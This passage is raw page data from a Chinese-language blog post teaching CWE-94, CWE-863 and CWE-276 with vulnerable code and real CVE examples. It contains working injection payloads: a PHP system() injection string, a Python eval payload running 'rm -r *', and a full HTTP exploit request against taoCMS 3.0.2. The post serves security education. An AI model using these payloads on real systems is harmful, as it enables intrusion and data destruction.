(EX_SOFTWARE);\\n}\\n\\n/* Create pid file after we drop privileges */\\nif (config.pidpath) {\\n        if (pidfile_create (config.pidpath) \u003c 0) {\\n                fprintf (stderr, \\\"%s: Could not create PID file.\\\\n\\\",\\n                         argv[0]);\\n                exit (EX_OSERR);\\n        }\\n}\\n\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":\"linear-gradient(180deg, transparent 24px, var(--bg-transparent-green) 24px 240px, transparent 240px, transparent 504px, var(--bg-transparent-red) 504px 720px, transparent 720px)\"},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$45\"}}]}]]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":[\"$\",\"a\",null,{\"href\":\"https://cwe.mitre.org/data/definitions/94.html\",\"target\":\"_blank\",\"rel\":\"noreferrer\",\"children\":\"【B】CWE-94: Improper Control of Generation of Code ('Code Injection')\"}]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"当产品允许用户输入包含代码语法的内容时，攻击者有可能以改变产品预期控制流的方式编写代码。这种改变可能导致任意代码的执行。\"}}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example 1\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$$MessageFile = \\\"messages.out\\\";\\nif ($_GET[\\\"action\\\"] == \\\"NewMessage\\\")\\n{\\n    $name = $_GET[\\\"name\\\"];\\n    $message = $_GET[\\\"message\\\"];\\n    $handle = fopen($MessageFile, \\\"a+\\\");\\n    fwrite($handle, \\\"\u003cb\u003e$name\u003c/b\u003e says '$message'\u003chr\u003e\\\\n\\\");\\n    fclose($handle);\\n    echo \\\"Message Saved!\u003cp\u003e\\\\n\\\";\\n}\\nelse if ($_GET[\\\"action\\\"] == \\\"ViewMessages\\\")\\n{\\n    include($MessageFile);\\n}\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$46\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"这段代码尝试将用户消息写入消息文件并允许用户查看它们。开发者可能希望文件只包含数据，然而攻击者可以构造以下参数：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Plain Text\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"name=h4x0r\\nmessage=%3C?php%20system(%22/bin/ls%20-l%22);?%3E\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"name=h4x0r\\nmessage=%3C?php%20system(%22/bin/ls%20-l%22);?%3E\\n\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"这会被解析成：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"\u003c?php system(\\\"/bin/ls -l\\\");?\u003e\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token php language-php\\\"\u003e\u003cspan class=\\\"token delimiter important\\\"\u003e\u0026lt;?php\u003c/span\u003e \u003cspan class=\\\"token function\\\"\u003esystem\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token string double-quoted-string\\\"\u003e\\\"/bin/ls -l\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\u003cspan class=\\\"token delimiter important\\\"\u003e?\u003e\u003c/span\u003e\u003c/span\u003e\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"这将导致用户查看它们的时候，PHP代码被解析执行。注意这种情况下，同样存在XSS漏洞风险。\"}}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example 2\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"def main():\\n    sum = 0\\n    numbers = eval(input(\\\"Enter a space-separated list of numbers: \\\"))\\n    for num in numbers:\\n        sum = sum + num\\n    print(f\\\"Sum of {numbers} = {sum}\\\")\\nmain()\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$47\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eeval\u003c/code\u003e函数会执行用户输入的代码，一个可以注入的载荷是\u003ccode class=\\\"x-inline-highlight\\\"\u003e__import__('subprocess').getoutput('rm -r *')\u003c/code\u003e。\"}}],[\"$\",\"div\",null,{\"className\":\"x-highlightblock highlight-background-blue\",\"children\":[[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example in real-world project\"}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"OpenCVE：\u003ca href=\\\"https://www.opencve.io/cve/CVE-2023-1947\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003eCVE-2023-1947\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eExploit\u003c/code\u003e：\u003ca href=\\\"https://gitee.com/misak7in/cve/blob/master/taocms.md\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003ehttps://gitee.com/misak7in/cve/blob/master/taocms.md\u003c/a\u003e\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"taoCMS 3.0.2存在代码注入漏洞，发送请求：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Plain Text\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"POST /admin/admin.php HTTP/1.1\\nHost: www.taocms.com\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\\nAccept-Encoding: gzip, deflate\\nContent-Type: application/x-www-form-urlencoded\\nContent-Length: 161\\nOrigin: http://www.taocms.com\\nConnection: close\\nReferer: http://www.taocms.com/admin/admin.php?action=category\u0026ctrl=add\\nCookie: PHPSESSID=3p2h8g38ejqf1402s5i384b7h0\\nUpgrade-Insecure-Requests: 1\\nX-Forwarded-For: 127.0.0.1\\nX-Originating-IP: 127.0.0.1\\nX-Remote-IP: 127.0.0.1\\nX-Remote-Addr: 127.0.0.1\\n\\nname=%27%29%29%3Bphpinfo%28%29%3B%2F*\u0026nickname=22\u0026fid=\u0026cattpl=\u0026listtpl=\u0026distpl=\u0026intro=33\u0026orders=\u0026status=1\u0026action=category\u0026id=\u0026ctrl=save\u0026Submit=%E6%8F%90%E4%BA%A4\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"POST /admin/admin.php HTTP/1.1\\nHost: www.taocms.com\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\\nAccept-Encoding: gzip, deflate\\nContent-Type: application/x-www-form-urlencoded\\nContent-Length: 161\\nOrigin: http://www.taocms.com\\nConnection: close\\nReferer: http://www.taocms.com/admin/admin.php?action=category\u0026amp;ctrl=add\\nCookie: PHPSESSID=3p2h8g38ejqf1402s5i384b7h0\\nUpgrade-Insecure-Requests: 1\\nX-Forwarded-For: 127.0.0.1\\nX-Originating-IP: 127.0.0.1\\nX-Remote-IP: 127.0.0.1\\nX-Remote-Addr: 127.0.0.1\\n\\nname=%27%29%29%3Bphpinfo%28%29%3B%2F*\u0026amp;nickname=22\u0026amp;fid=\u0026amp;cattpl=\u0026amp;listtpl=\u0026amp;distpl=\u0026amp;intro=33\u0026amp;orders=\u0026amp;status=1\u0026amp;action=category\u0026amp;id=\u0026amp;ctrl=save\u0026amp;Submit=%E6%8F%90%E4%BA%A4\\n\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"请求的参数解析后是：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Plain Text\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"name='));phpinfo();/*\u0026nickname=...\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"name='));phpinfo();/*\u0026amp;nickname=...\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"内容会被写入\u003ccode class=\\\"x-inline-highlight\\\"\u003ecat_array.inc\u003c/code\u003e文件：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"\u003c?php\\n$cats=array(\\n0=\u003earray(\\n'name'=\u003e'未分组',\\n'status'=\u003e0,\\n'orders'=\u003e0,\\n'id'=\u003e0),\\n7=\u003earray(\\n'name'=\u003e''));phpinfo();/*\\n\\n...*/\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$48\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"后面的内容被注释。文件在\u003ccode class=\\\"x-inline-highlight\\\"\u003e/wap/index.php\u003c/code\u003e被引入，从而可以获取系统配置。\"}}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":[\"$\",\"a\",null,{\"href\":\"https://cwe.mitre.org/data/definitions/863.html\",\"target\":\"_blank\",\"rel\":\"noreferrer\",\"children\":\"【C】CWE-863: Incorrect Authorization\"}]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"错误的授权，没有正确验证用户是否有权访问资源。\"}}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example 1\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$$role = $_COOKIES['role'];\\nif (!$role)\\n{\\n    $role = getRole('user');\\n    if ($role)\\n    {\\n        // save the cookie to send out in future responses\\n        setcookie(\\\"role\\\", $role, time() + 60 * 60 * 2);\\n    }\\n    else\\n    {\\n        ShowLoginScreen();\\n        die(\\\"\\\\n\\\");\\n    }\\n}\\nif ($role == 'Reader')\\n{\\n    DisplayMedicalHistory($_POST['patient_ID']);\\n}\\nelse\\n{\\n    die(\\\"You are not Authorized to view this record\\\\n\\\");\\n}\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":\"linear-gradient(180deg, transparent 24px, var(--bg-transparent-golden) 24px 48px, transparent 48px)\"},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$49\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"修改cookie即可绕过授权。\"}}],[\"$\",\"div\",null,{\"className\":\"x-highlightblock highlight-background-blue\",\"children\":[[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example in real-world project\"}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"OpenCVE：\u003ca href=\\\"https://www.opencve.io/cve/CVE-2024-22208\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003eCVE-2024-22208\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eExploit\u003c/code\u003e：\u003ca href=\\\"https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-9hhf-xmcw-r3xg\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003ehttps://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-9hhf-xmcw-r3xg\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003ePatch\u003c/code\u003e：\u003ca href=\\\"https://github.com/thorsten/phpMyFAQ/commit/a34d94ab7b1be9256a9ef898f18ea6bfb63f6f1e\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003ehttps://github.com/thorsten/phpMyFAQ/commit/a34d94ab7b1be9256a9ef898f18ea6bfb63f6f1e\u003c/a\u003e\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"phpMyFAQ v3.2.5前的\u003ccode class=\\\"x-inline-highlight\\\"\u003eSharing FAQ\u003c/code\u003e功能可以给其他邮箱分享讯息，前端只有\u003ccode class=\\\"x-inline-highlight\\\"\u003e5\u003c/code\u003e个输入框（希望用户最多分享给\u003ccode class=\\\"x-inline-highlight\\\"\u003e5\u003c/code\u003e个邮箱），然而后端并没有对数量做限制，攻击者可以构造请求发送大量邮件。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"部分补丁的内容：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$4a\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":\"linear-gradient(180deg, transparent 144px, var(--bg-transparent-red) 144px 168px, transparent 168px, transparent 240px, var(--bg-transparent-green) 240px 456px, transparent 456px)\"},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$4b\"}}]}]]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":[\"$\",\"a\",null,{\"href\":\"https://cwe.mitre.org/data/definitions/276.html\",\"target\":\"_blank\",\"rel\":\"noreferrer\",\"children\":\"【B】CWE-276: Incorrect Default Permissions\"}]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"错误的默认权限。指软件系统、应用程序、文件或资源在创建时被分配了不适当的默认权限。这些默认权限可能过于宽松，允许未授权的用户或进程进行不必要或有害的访问和操作，从而导致潜在的安全漏洞。\"}}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example 1\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"软件在安装或初始化时，通常会创建一些文件、目录或资源。这些资源会被分配默认的权限（读、写、执行权限等）。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"如果这些默认权限设置得过于宽松，比如允许所有用户都具有读写权限，那么未授权的用户可能会访问、修改或删除这些文件，导致数据泄露、篡改或破坏。\"}}],[\"$\",\"div\",null,{\"className\":\"x-highlightblock highlight-background-blue\",\"children\":[[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example in real-world project\"}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"OpenCVE：\u003ca href=\\\"https://www.opencve.io/cve/CVE-2005-1941\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003eCVE-2005-1941\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eExploit\u003c/code\u003e：\u003ca href=\\\"https://bugs.gentoo.org/93558\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003ehttps://bugs.gentoo.org/93558\u003c/a\u003e\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"0.9.5-r1版本之前的SilverCity安装了\u003ccode class=\\\"x-inline-highlight\\\"\u003ecgi-styler-form.py\u003c/code\u003e、\u003ccode class=\\\"x-inline-highlight\\\"\u003ecgistyler.py\u003c/code\u003e和\u003ccode class=\\\"x-inline-highlight\\\"\u003esource2html.py\u003c/code\u003e，具有\u003ccode class=\\\"x-inline-highlight\\\"\u003eworld writable\u003c/code\u003e权限。\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Plain Text\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"# ls -l /usr/bin/*.py\\n-rwxrwxrwx  1 root root 4443 May 22 16:58 /usr/bin/cgi-styler-form.py\\n-rwxrwxrwx  1 root root 2990 May 22 16:58 /usr/bin/cgi-styler.py\\n-rwxrwxrwx  1 root root 3776 May 22 16:58 /usr/bin/source2html.py\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"# ls -l /usr/bin/*.py\\n-rwxrwxrwx  1 root root 4443 May 22 16:58 /usr/bin/cgi-styler-form.py\\n-rwxrwxrwx  1 root root 2990 May 22 16:58 /usr/bin/cgi-styler.py\\n-rwxrwxrwx  1 root root 3776 May 22 16:58 /usr/bin/source2html.py\\n\"}}]}]]}]]}]]\n"])</script><script>self.__next_f.push([1,"11:[[\"$\",\"meta\",\"0\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}],[\"$\",\"meta\",\"1\",{\"charSet\":\"utf-8\"}],[\"$\",\"title\",\"2\",{\"children\":\"Learn CWEs \u0026 Real-word Examples - 铃木的网络日记\"}],[\"$\",\"link\",\"3\",{\"rel\":\"canonical\",\"href\":\"https://1kuzus.github.io/24b/learn-cwes/\"}]]\n5:null\n"])</script><script>self.__next_f.push([1,""])</script></body></html>